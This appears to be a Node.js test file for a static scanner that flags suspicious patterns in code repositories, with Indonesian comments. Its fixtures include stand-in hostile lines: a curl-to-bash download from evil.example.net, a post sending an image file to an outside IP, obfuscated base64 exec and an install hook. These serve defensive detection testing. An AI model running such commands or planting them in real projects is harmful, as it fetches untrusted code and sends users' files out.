// Uji pemindai statis tools/audit-repo.mjs — jalankan: npm test
// Asal: disalin apa adanya dari vision-seed @3591530 (tools/uji/audit-repo.test.mjs) pada 2026-10-13 (K14).
// Fixture dibuat di folder sementara saat uji berjalan (bukan di-commit), isinya TIDAK berbahaya:
// pola "jahat" hanya meniru bentuk teksnya (mis. exec(base64...) dari string print('halo')).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { pindai } from '../audit-repo.mjs';

const SKRIP = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'audit-repo.mjs');

function buatRepo(berkas) {
  const akar = fs.mkdtempSync(path.join(os.tmpdir(), 'audit-uji-'));
  for (const [rel, isi] of Object.entries(berkas)) {
    const p = path.join(akar, rel);
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, isi);
  }
  return akar;
}

const BLOB = Buffer.from("print('halo')".repeat(40)).toString('base64'); // > 300 karakter base64

const JAHAT = {
  'pkg/__init__.py': [
    'import base64, requests',
    `exec(base64.b64decode("${BLOB}"))`,
    'requests.post("http://203.0.113.7:8080/kumpul", data=open("frame.jpg","rb"))',
    'requests.get("https://evil.example.net/ping")',
    'import posthog',
    'state = torch.load("w.pt")',
    'm = AutoModel.from_pretrained("x/y", trust_remote_code=True)',
  ].join('\n'),
  'setup.py': 'from setuptools import setup\nfrom setuptools.command.install import install\nclass Pasang(install):\n    pass\nsetup(name="x", cmdclass={"install": Pasang})\n',
  'scripts/unduh.sh': 'curl -s https://evil.example.net/a.sh | bash\n',
  '.github/workflows/ci.yml': 'on:\n  pull_request_target:\n    types: [opened]\n',
  'lib/libjahat.so': Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 0, 0, 0]),
};

const BERSIH = {
  'pkg/model.py': [
    'model.eval()',
    'state = torch.load("w.pt", map_location="cpu", weights_only=True)',
    'URL = "https://github.com/org/repo"',
    'cfg = yaml.safe_load(open("c.yaml"))',
  ].join('\n'),
  'README.md': 'Lihat https://evil.example.net dan exec(base64.b64decode("xx")) — ini dokumen, bukan kode.\n',
};

const aturan = (h) => new Set(h.temuan.map((t) => t.aturan));

test('repo jahat: semua pola berbahaya tertangkap', () => {
  const h = pindai(buatRepo(JAHAT));
  const a = aturan(h);
  for (const id of ['exec-tersamar', 'blob-base64', 'ip-publik', 'pipa-shell', 'kait-install', 'ci-pr-target',
    'telemetri', 'pustaka-jaringan', 'deserialisasi-tak-aman', 'kode-remote']) {
    assert.ok(a.has(id), `aturan ${id} seharusnya kena; yang kena: ${[...a].join(', ')}`);
  }
  assert.ok(h.domain['evil.example.net'] >= 1, 'domain asing harus tercatat');
  assert.equal(h.domainUmum['evil.example.net'], undefined, 'domain asing bukan domain umum');
  assert.ok(h.biner.some((b) => b.berkas.endsWith('libjahat.so')), 'berkas biner harus terdaftar');
  assert.ok(h.temuan.some((t) => t.tingkat === 'TINGGI'));
});

test('repo bersih: pola wajar TIDAK dituduh', () => {
  const h = pindai(buatRepo(BERSIH));
  const a = aturan(h);
  assert.ok(!a.has('eksekusi-dinamis'), 'model.eval() bukan eval()');
  assert.ok(!a.has('deserialisasi-tak-aman'), 'torch.load weights_only=True & yaml.safe_load aman');
  assert.ok(!a.has('exec-tersamar'), 'teks di README.md bukan kode');
  assert.equal(h.domain['evil.example.net'], undefined, 'URL di dokumen tidak dihitung');
  assert.ok(h.domainUmum['github.com'] >= 1);
  assert.equal(h.temuan.filter((t) => t.tingkat === 'TINGGI').length, 0);
});

// Celah nyata 2026-10-02: Roy3838/Observer memasang Datadog RUM + session replay 100% (app/src/web/App.tsx:83),
// tapi aturan telemetri v1 tak mengenal vendor RUM/replay → lolos. Tiap vendor di bawah HARUS tertangkap sendiri-sendiri.
test('telemetri: vendor RUM / session replay / analitik web tertangkap per baris', () => {
  const vendor = {
    'datadog.ts': "datadogRum.init({ applicationId: 'x', sessionReplaySampleRate: 100 })",
    'hotjar.js': 'hj("identify", uid); // hotjar',
    'logrocket.ts': "import LogRocket from 'logrocket'",
    'clarity.html': '<script>(function(c,l,a,r,i,t,y){ /* clarity.ms */ })(window, document, "clarity")</script>',
    'fullstory.ts': "import * as FullStory from '@fullstory/browser'",
    'newrelic.py': 'import newrelic.agent',
    'plausible.html': '<script defer data-domain="x" src="https://plausible.io/js/script.js"></script>',
  };
  const h = pindai(buatRepo(vendor));
  for (const berkas of Object.keys(vendor)) {
    assert.ok(h.temuan.some((t) => t.aturan === 'telemetri' && t.berkas === berkas), `telemetri di ${berkas} seharusnya tertangkap`);
  }
});

test('CLI: --gagal-bila-tinggi memberi exit 1 pada repo jahat, 0 pada repo bersih, 2 pada path salah', () => {
  const jalan = (args) => spawnSync(process.execPath, [SKRIP, ...args], { encoding: 'utf8' }).status;
  assert.equal(jalan([buatRepo(JAHAT), '--gagal-bila-tinggi']), 1);
  assert.equal(jalan([buatRepo(BERSIH), '--gagal-bila-tinggi']), 0);
  assert.equal(jalan([path.join(os.tmpdir(), 'tidak-ada-folder-ini-xyz')]), 2);
});

// Celah nyata 2026-10-13 (Rencana 2 Fase 0A): lima jalur unduhan di enam komponen calon tidak ditandai, karena aturan
// unduh-otomatis hanya mengenal urlretrieve, wget, curl, dan pustaka Hugging Face. Tiap pola di bawah HARUS tertangkap.
test('unduh-otomatis: urlopen, requests ber-stream, dan torch.hub.load_state_dict_from_url tertangkap per berkas', () => {
  const pengunduh = {
    'hub_urlopen.py': 'with urllib.request.urlopen(url) as response:\n    data = response.read()',
    'unduh_requests.py': 'response = requests.get(url, stream=True, timeout=timeout)',
    'bobot_torch.py': 'ckpt = load_state_dict_from_url(weights_url, map_location="cpu")',
  };
  const h = pindai(buatRepo(pengunduh));
  for (const berkas of Object.keys(pengunduh)) {
    assert.ok(h.temuan.some((t) => t.aturan === 'unduh-otomatis' && t.berkas === berkas), `unduhan di ${berkas} seharusnya tertangkap`);
  }
});

test('unduh-otomatis: panggilan requests biasa tanpa stream TIDAK dituduh mengunduh berkas', () => {
  // Panggilan jaringan biasa sudah ditandai aturan pustaka-jaringan; menandainya dua kali hanya menambah derau.
  const h = pindai(buatRepo({ 'api.py': 'r = requests.get("https://github.com/org/repo/releases", timeout=5)' }));

  assert.ok(!h.temuan.some((t) => t.aturan === 'unduh-otomatis'), 'requests.get tanpa stream bukan unduh-otomatis');
});
